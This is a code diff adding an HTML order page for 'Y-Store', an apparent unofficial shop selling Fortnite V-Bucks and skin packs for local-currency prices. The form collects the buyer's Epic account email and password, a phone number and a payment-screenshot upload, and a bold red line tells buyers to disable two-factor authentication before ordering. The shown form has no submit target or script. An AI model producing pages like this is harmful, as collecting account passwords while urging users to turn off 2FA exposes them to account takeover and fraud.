@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+<meta charset="UTF-8">
+<title>Y-Store - Order</title>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<style>
+/* General Reset */
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+  font-family: 'Poppins', sans-serif;
+}
+
+/* Body and Background */
+body {
+  min-height: 100vh;
+  background: linear-gradient(135deg, #e2e2e2, #ffffff);
+  color: black;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  padding: 20px;
+}
+
+/* Order Form Container */
+.order-container {
+  background: rgba(0, 0, 0, 0.8);
+  color: white;
+  border-radius: 12px;
+  box-shadow: 0 5px 15px rgba(255, 0, 0, 0.5);
+  padding: 30px 20px;
+  width: 100%;
+  max-width: 400px;
+  text-align: center;
+}
+
+/* Form Heading */
+.order-container h1 {
+  font-size: 2rem;
+  font-weight: 600;
+  margin-bottom: 20px;
+  color: #ff0000;
+  text-shadow: 0 0 8px #ff0000, 0 0 15px #ff3333;
+}
+
+/* Input Fields */
+.order-container input[type="text"],
+.order-container input[type="password"],
+.order-container input[type="file"],
+.order-container input[type="tel"],
+.order-container select {
+  width: 100%;
+  padding: 10px 15px;
+  margin: 10px 0;
+  border: 1px solid rgba(255, 0, 0, 0.7);
+  border-radius: 8px;
+  background: rgba(255, 255, 255, 0.9);
+  color: #333;
+  font-size: 16px;
+  transition: border 0.3s;
+}
+
+.order-container input:focus,
+.order-container select:focus {
+  border: 1px solid #ff0000;
+  outline: none;
+}
+
+/* Submit Button */
+.order-container button {
+  margin-top: 20px;
+  background: #ff0000;
+  color: white;
+  border: none;
+  padding: 12px 20px;
+  font-size: 18px;
+  font-weight: 500;
+  border-radius: 8px;
+  cursor: pointer;
+  transition: background 0.3s, transform 0.2s;
+}
+
+.order-container button:hover {
+  background: #d10000;
+  transform: scale(1.05);
+}
+
+/* Responsive Design */
+@media (max-width: 768px) {
+  .order-container {
+    width: 90%;
+  }
+}
+</style>
+</head>
+<body>
+
+<div class="order-container">
+  <h1>Place Your Order (fortnite)</h1>
+  <form id="orderForm" enctype="multipart/form-data">
+    <!-- Text Fields -->
+    <input type="text" name="epic_username" placeholder="Epic Email" required>
+    <input type="password" name="epic_password" placeholder="Epic Password" required>
+    <input type="tel" name="phone_number" placeholder="Phone Number" required>
+
+    <!-- Dropdown List -->
+    <select name="item" required>
+      <option value="" disabled selected>Select an Item</option>
+      <option value="1000 VB">1000 VB = 380</option>
+      <option value="2800 VB">2800 VB = 895</option>
+      <option value="5000 VB">5000 VB = 1465</option>
+      <option value="13500 VB">13500 VB = 3050</option>
+      <option value="Starter pack">Starter pack = 250</option>
+      <option value="Crew pack">Crew pack = 200</option>
+      <option value="Ghoul punk pack">Ghoul punk pack = 720</option>
+      <option value="Frozen legends pack">Frozen legends pack = 700</option>
+      <option value="Darkest grumblings pack">Darkest grumblings pack = 200</option>
+      <option value="Agency renegades pack">Agency renegades pack = 800</option>
+    </select>
+
+    <!-- Image Upload Field -->
+	 <label for="image"> Money transaction image </label>
+    <input type="file" name="transaction_image" accept="image/*" required>
+
+    <!-- Submit Button -->
+    <button type="submit">Checkout</button>
+	<h1><strong style="color:red;">DISABLE 2FA BEFORE ORDERING!!</strong></h1>
+  </form>
+</div>
+<footer class="site-footer">
+  <div class="container">
+    <div class="row">
+      <div class="col-12 text-center">
+        <p>&copy; 2024 Mohamed Diaa and Y Store. All rights reserved.</p>
+      </div>
+    </div>
+  </div>
+</footer>
+</body>
+</html>
